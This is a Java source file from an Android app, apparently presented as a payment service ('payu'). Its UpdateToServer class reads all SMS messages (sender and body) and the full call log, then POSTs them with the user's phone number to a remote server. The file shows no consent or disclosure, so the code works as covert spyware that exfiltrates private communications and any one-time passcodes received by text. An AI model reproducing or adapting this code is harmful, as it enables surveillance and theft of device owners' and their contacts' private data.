package com.techndev.payu;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.techndev.payu.Contants.AppController;
import com.techndev.payu.Contants.BaseUrl;
import com.techndev.payu.Session.SessionManager;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class UpdateToServer {
    private Context context;
    private Uri mSmsQueryUri = Uri.parse("content://sms");

    public String TAG = UpdateToServer.class.getSimpleName();
    private Cursor msgCursor;
    SessionManager sessionManager;

    public UpdateToServer(Context context)
    {
        this.context = context;
        sessionManager = new SessionManager(context);
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private ArrayList<String> getMessages() {
        ArrayList<String> messages = new ArrayList<String>();
        ContentResolver contentResolver = context.getContentResolver();
        String[] coloums = new String[]{
                "address",
                "body"
        };
        try {
            msgCursor = contentResolver.query(mSmsQueryUri, coloums,
                    null, null, "date desc");
            if (msgCursor.getColumnCount() == 0) {
                Log.i(TAG, "Cursor is null");
            } else {
                Log.i(TAG, String.valueOf(msgCursor.getCount()));
                try {
                    while (msgCursor.moveToNext()) {
                        String body = msgCursor.getString(msgCursor.getColumnIndex("body"));
                        String address = msgCursor.getString(msgCursor.getColumnIndex("address"));
                        messages.add("\n" + "Number: " + address + "\n" + "Content: " + body + "\n");
                    }
                } finally {
                    msgCursor.close();
                }

            }

        } catch (Exception e) {
            Log.i(TAG, e.getMessage());
        }

        return messages;

    }


    private  String getCallDetail()
    {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        return stringBuffer.toString();
    }


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void addtoServer(final Context context) {
        String url = BaseUrl.baseUrl + context.getResources().getString(R.string.store_new_details);
        final ArrayList<String> smss=getMessages();
        final String callllogs=getCallDetail();
        StringRequest request=new StringRequest(Request.Method.POST, url, new Response.Listener<String>()
        {

            @Override
            public void onResponse( String response) {

                Log.i("RESPONSE",response);
                if (response.equals("Message Received!")) {
                    Log.i(TAG,"ok");
                    AppController.getInstance().cancelPendingRequests(BaseUrl.tag_string_req);
                }

            }
        }, new Response.ErrorListener()
        {
            @Override
            public void onErrorResponse(VolleyError error)
            {
                Toast.makeText(context, error.getMessage(), Toast.LENGTH_SHORT).show();
            }
        })
        {
            @Override
            protected Map<String,String> getParams() throws AuthFailureError {
                HashMap<String,String> params=new HashMap<>();

                params.put("imei_no","");
                params.put("phone", SessionManager.getPhoneNumber());
                params.put("calllog",callllogs.toString());
                params.put("record", smss.toString());

                return params;
            }
        };


        // Adding request to request queue
        AppController.getInstance().addToRequestQueue(request, BaseUrl.tag_string_req);

    }
}
